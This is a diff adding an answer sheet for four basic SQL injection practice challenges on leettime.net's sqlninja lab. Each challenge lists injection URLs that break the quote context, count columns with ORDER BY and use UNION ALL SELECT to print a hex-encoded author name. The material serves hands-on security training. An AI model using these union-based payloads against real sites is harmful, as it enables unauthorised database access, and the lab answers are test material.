@@ -1,0 +1,43 @@
+Solved Paper of Security Idiots Sql Injection
+Chapter: Basic Injection
+By: Suvadip Kar || Spider Mate
+
+[ Challenge 1 ] >
+
+LINK: http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1 
+
+SOLVE:
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+ORDER+BY+4-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=-1'+UNION+ALL+SELECT+1,2,3-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=-1'+UNION+ALL+SELECT+1,0x53555641444950204b4152,3-- -
+
+[ Challenge 2 ] >
+
+LINK: http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1 
+
+SOLVE:
+http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1'
+http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+ORDER+BY+5-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=-1+UNION+ALL+SELECT+1,2,3,4-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=-1+UNION+ALL+SELECT+1,0x53555641444950204b4152,3,4-- -
+
+[ Challenge 3 ] >
+
+LINK: http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=1
+
+SOLVE:
+http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=1"
+http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=1"+ORDER+BY+6-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=-1"+UNION+ALL+SELECT+1,2,3,4,5-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=-1"+UNION+ALL+SELECT+1,0x53555641444950204b4152,3,4,5-- -
+
+[ Challenge 4 ] >
+
+LINK: http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1
+
+SOLVE:
+http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1'
+http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1' )+ORDER+BY+5-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=-1' )+UNION+ALL+SELECT+1,2,3,4-- -
+http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=-1' )+UNION+ALL+SELECT+1,0x53555641444950204b4152,3,4-- -
